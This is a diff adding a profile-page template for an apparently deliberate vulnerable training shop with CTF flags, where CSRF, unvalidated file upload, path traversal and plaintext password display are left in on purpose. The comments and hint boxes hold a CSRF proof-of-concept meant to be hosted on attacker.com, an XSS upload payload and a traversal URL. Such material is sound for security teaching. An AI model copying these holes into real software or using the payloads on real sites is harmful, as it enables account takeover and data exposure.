@@ -1,0 +1,201 @@
+<%- include('../partials/header') %>
+
+<div class="profile-page">
+  <div class="profile-layout">
+
+    <!-- Sidebar -->
+    <aside class="profile-sidebar">
+      <div class="profile-avatar-section">
+        <img src="<%= profile.avatar || '/images/default-avatar.png' %>"
+          alt="Avatar" class="profile-avatar-img"
+          onerror="this.src='https://ui-avatars.com/api/?name=<%= encodeURIComponent(profile.full_name||profile.username) %>&background=FF9900&color=fff&size=100'">
+        <h3><%= profile.full_name || profile.username %></h3>
+        <span class="role-badge role-<%= profile.role %>"><%= profile.role.toUpperCase() %></span>
+      </div>
+      <nav class="profile-nav">
+        <a href="/profile" class="active"><i class="fas fa-user"></i> Account</a>
+        <a href="/orders"><i class="fas fa-box"></i> Orders</a>
+        <a href="/profile#security"><i class="fas fa-shield-alt"></i> Security</a>
+        <a href="/profile#avatar"><i class="fas fa-camera"></i> Profile Photo</a>
+        <% if (user.role === 'admin') { %>
+          <a href="/admin" class="admin-link"><i class="fas fa-cog"></i> Admin Panel</a>
+        <% } %>
+        <a href="/auth/logout"><i class="fas fa-sign-out-alt"></i> Sign Out</a>
+      </nav>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="profile-main">
+
+      <!-- Flash Messages -->
+      <% if (typeof success !== 'undefined' && success) { %>
+        <div class="alert alert-success">✅ <%= success %></div>
+      <% } %>
+      <% if (typeof error !== 'undefined' && error) { %>
+        <div class="alert alert-danger">⚠️ <%= error %></div>
+      <% } %>
+
+      <!-- Flag Reveals -->
+      <% if (csrfFlag) { %>
+        <div class="flag-banner">🎯 <strong>CSRF Exploit Successful!</strong><br><code><%= csrfFlag %></code></div>
+      <% } %>
+      <% if (privEscFlag) { %>
+        <div class="flag-banner">🎯 <strong>Privilege Escalation!</strong><br><code><%= privEscFlag %></code></div>
+      <% } %>
+      <% if (fileUploadFlag) { %>
+        <div class="flag-banner">🎯 <strong>File Upload Bypass!</strong><br><code><%= fileUploadFlag %></code></div>
+      <% } %>
+
+      <!-- Account Stats -->
+      <div class="profile-stats">
+        <div class="stat-box">
+          <div class="stat-num"><%= stats.count || 0 %></div>
+          <div class="stat-label">Orders</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-num">$<%= parseFloat(stats.total_spent || 0).toFixed(0) %></div>
+          <div class="stat-label">Total Spent</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-num">⭐ VulnPrime</div>
+          <div class="stat-label">Membership</div>
+        </div>
+      </div>
+
+      <!-- Profile Info -->
+      <div class="profile-section">
+        <h2>Personal Information</h2>
+        <form action="/profile/update" method="POST" class="profile-form">
+          <div class="form-row">
+            <div class="form-group">
+              <label>Full Name</label>
+              <input type="text" name="full_name" class="form-input" value="<%= profile.full_name || '' %>">
+            </div>
+            <div class="form-group">
+              <label>Username</label>
+              <input type="text" class="form-input" value="<%= profile.username %>" disabled>
+              <small>Username cannot be changed</small>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Email</label>
+              <input type="email" class="form-input" value="<%= profile.email %>" disabled>
+            </div>
+            <div class="form-group">
+              <label>Phone</label>
+              <input type="tel" name="phone" class="form-input" value="<%= profile.phone || '' %>">
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Default Shipping Address</label>
+            <textarea name="address" class="form-input" rows="3"><%= profile.address || '' %></textarea>
+          </div>
+          <button type="submit" class="btn-amazon">Save Changes</button>
+        </form>
+      </div>
+
+      <!-- Password Change (CSRF Vulnerable) -->
+      <div class="profile-section" id="security">
+        <h2>Change Password</h2>
+        <div class="vulnerability-label">⚠️ No CSRF Protection on this endpoint</div>
+
+        <!-- VULNERABILITY: No CSRF token in this form -->
+        <!-- CSRF PoC: Host this on attacker.com and victim visits it while logged in -->
+        <!--
+          <form action="http://localhost:3000/profile/password" method="POST">
+            <input name="new_password" value="hacked123">
+            <input name="confirm_password" value="hacked123">
+          </form>
+          <script>document.forms[0].submit()</script>
+        -->
+        <form action="/profile/password" method="POST" class="profile-form">
+          <!-- NOTE: No CSRF token hidden field! Intentional vulnerability -->
+          <div class="form-group">
+            <label>Current Password</label>
+            <input type="password" name="current_password" class="form-input" placeholder="Current password">
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>New Password</label>
+              <input type="password" name="new_password" class="form-input" placeholder="New password (min 4 chars)">
+            </div>
+            <div class="form-group">
+              <label>Confirm New Password</label>
+              <input type="password" name="confirm_password" class="form-input" placeholder="Confirm new password">
+            </div>
+          </div>
+          <button type="submit" class="btn-amazon">Change Password</button>
+        </form>
+
+        <div class="hint-box" style="margin-top:12px">
+          <h4>💡 CSRF Challenge Hint</h4>
+          <p>No <code>csrf_token</code> field exists in this form. Any website can submit this form on your behalf.</p>
+          <p><strong>PoC:</strong> Save this as <code>csrf.html</code> and open it while logged into VulnShop:</p>
+          <pre class="code-block">&lt;form action="http://localhost:3000/profile/password" method="POST"&gt;
+  &lt;input name="new_password" value="hacked123"&gt;
+  &lt;input name="confirm_password" value="hacked123"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+        </div>
+      </div>
+
+      <!-- File Upload (Vulnerable) -->
+      <div class="profile-section" id="avatar">
+        <h2>Profile Photo</h2>
+        <div class="vulnerability-label">⚠️ No file type validation — any file extension accepted</div>
+
+        <div class="avatar-upload-area">
+          <img src="<%= profile.avatar || '/images/default-avatar.png' %>"
+            alt="Current avatar" class="current-avatar"
+            onerror="this.src='https://ui-avatars.com/api/?name=<%= encodeURIComponent(profile.username) %>&size=100'">
+
+          <!-- VULNERABILITY: Server accepts any file extension including .html, .js, .php -->
+          <!-- Upload a .html file containing <script>alert(1)</script> -->
+          <!-- Then access the uploaded file at /uploads/avatar_X_Y.html -->
+          <form action="/profile/avatar" method="POST" enctype="multipart/form-data" class="avatar-form">
+            <label for="avatarFile" class="file-drop-zone">
+              <i class="fas fa-cloud-upload-alt fa-2x"></i>
+              <span>Click to upload or drag & drop</span>
+              <small>Any file accepted (PNG, JPG, GIF... or HTML, JS!)</small>
+              <input type="file" name="avatar" id="avatarFile" accept="*/*">
+            </label>
+            <button type="submit" class="btn-amazon">Upload Photo</button>
+          </form>
+        </div>
+
+        <div class="hint-box">
+          <h4>💡 File Upload Challenge</h4>
+          <p>Upload any file — the server does <strong>NOT</strong> validate file type.</p>
+          <ol>
+            <li>Create a file <code>shell.html</code> with content: <code>&lt;script&gt;alert('XSS via upload!')&lt;/script&gt;</code></li>
+            <li>Upload it as your "profile photo"</li>
+            <li>Access it at <code>/uploads/avatar_[userid]_[timestamp].html</code></li>
+          </ol>
+          <p>Path traversal also works: <a href="/profile/download?file=../../package.json" target="_blank"><code>/profile/download?file=../../package.json</code></a></p>
+        </div>
+      </div>
+
+      <!-- Account Info (sensitive data exposure) -->
+      <div class="profile-section">
+        <h2>Account Information</h2>
+        <table class="info-table">
+          <tr><td>User ID</td><td><code><%= profile.id %></code></td></tr>
+          <tr><td>Username</td><td><%= profile.username %></td></tr>
+          <tr><td>Role</td><td><code><%= profile.role %></code></td></tr>
+          <tr>
+            <!-- VULNERABILITY: Password shown in cleartext (stored as plaintext in DB) -->
+            <td>Password (stored)</td>
+            <td><code class="sensitive"><%= profile.password %></code> <span class="vuln-tag">PLAINTEXT STORAGE</span></td>
+          </tr>
+          <tr><td>Member Since</td><td><%= new Date(profile.created_at).toLocaleDateString() %></td></tr>
+        </table>
+        <p class="vuln-note">⚠️ Passwords are stored in plaintext — this is intentional for training purposes.</p>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<%- include('../partials/footer') %>
+<%- include('../partials/flag-modal') %>
